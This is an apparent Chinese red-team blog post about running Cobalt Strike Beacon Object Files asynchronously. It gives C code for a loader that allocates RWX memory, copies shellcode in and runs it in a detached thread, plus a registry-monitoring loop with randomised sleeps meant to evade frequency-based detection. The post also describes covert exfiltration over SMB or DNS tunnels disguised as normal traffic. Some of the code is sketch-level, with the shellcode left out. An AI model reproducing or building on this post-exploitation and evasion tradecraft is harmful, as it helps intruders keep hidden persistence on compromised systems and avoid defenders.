# Async BOF：让Cobalt Strike的Beacon学会"多线程"思考

> *"当你的后门开始异步工作，防守方的日志看起来就像被猫踩过的键盘——到处都是线索，却拼不出完整的故事。"*

## 0x00 前言

在传统的红队作业中，BOF（Beacon Object Files）一直是Cobalt Strike的"瑞士军刀"——小巧、灵活、易于定制。但有一个致命缺陷：它是同步的。当你执行一个长时间监控任务时，Beacon会僵在那里，像个傻愣愣的哨兵。

这正是我开发[async_bof](https://github.com/9Insomnie/async_bof)的原因。本文将深入解析如何让Beacon学会"多线程"思考，实现真正的异步监控。

## 0x01 同步BOF的痛点

传统BOF的执行流程：

```c
// 典型同步BOF
void go(char* args, int alen) {
    // Beacon阻塞在这里...
    monitor_registry_key(); // 可能要等几小时
    // ...直到这里才返回
}
```

**问题清单**：
- Beacon线程被阻塞，无法接收新任务
- 长时间无心跳，可能被C2判定为失联
- 无法同时执行多个监控任务
- 想要停止？只能杀死进程

作为"永动机型失眠患者"，这种设计显然无法满足我的需求。

## 0x02 异步架构设计

### 核心思想：BOF只是启动器

我们转变思路：BOF不再执行具体任务，而是作为一个**微型加载器**，在独立线程中运行真正的监控逻辑。

架构示意图：

```
BOF (主线程)
   ↓
创建新线程 → 加载Shellcode → 独立运行监控
   ↓
立即返回   ←  Beacon保持响应
```

### 关键技术点

**1. 线程注入技巧**

```c
// 伪代码：在自身进程创建工作线程
HANDLE hThread = CreateThread(
    NULL,
    0,
    (LPTHREAD_START_ROUTINE)shellcode_addr,
    NULL,
    0,
    NULL
);

// 关键：不需要等待线程结束
// CloseHandle(hThread); // 让线程独立运行
```

**2. Shellcode自注入**

为了避免磁盘文件和进程注入检测，我们采用**自注入**：

```c
// 1. BOF将监控逻辑Shellcode写入自身进程内存
// 2. 创建线程执行Shellcode
// 3. BOF主函数立即返回，Beacon继续工作
```

**3. 与C2的隐秘通信**

监控线程需要回传数据，但不能走常规通道：

```c
// 使用Beacon的SMB通道或DNS隧道
// 数据分片、时间混淆、协议伪装
// 让防守方以为这是正常流量
```

## 0x03 实战：异步注册表监控

让我们实现一个**异步注册表监控**BOF，监控Run键的变更。

### 3.1 核心监控逻辑（Shellcode）

```c
// monitor.c
void registry_monitor() {
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    RegNotifyChangeKeyValue(
        hKey,
        TRUE,
        REG_NOTIFY_CHANGE_LAST_SET,
        hEvent,
        TRUE
    );

    while(1) {
        if (WaitForSingleObject(hEvent, INFINITE) == WAIT_OBJECT_0) {
            // 变化发生！
            // 1. 收集新数据
            // 2. 通过隐蔽通道回传
            // 3. 重新设置监控
            report_change();
        }
        Sleep(30000 + (rand() % 60000)); // 随机间隔，绕过频率检测
    }
}
```

### 3.2 BOF加载器

```c
// loader.c
void go(char* args, int alen) {
    // 1. 将monitor.c编译为Shellcode
    unsigned char* shellcode = ...;

    // 2. 在自身进程分配内存
    void* exec = VirtualAlloc(
        NULL,
        shellcode_len,
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

    // 3. 写入Shellcode
    memcpy(exec, shellcode, shellcode_len);

    // 4. 创建独立线程（关键！不等待）
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);

    // 5. 立即返回，Beacon恢复响应
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Registry monitor deployed!");
}
```

### 3.3 编译与使用

```bash
# 使用mingw编译
x86_64-w64-mingw32-gcc -c monitor.c -o monitor.o
x86_64-w64-mingw32-gcc -c loader.c -o loader.o

# 链接为BOF
# （具体命令见GitHub项目README）
```
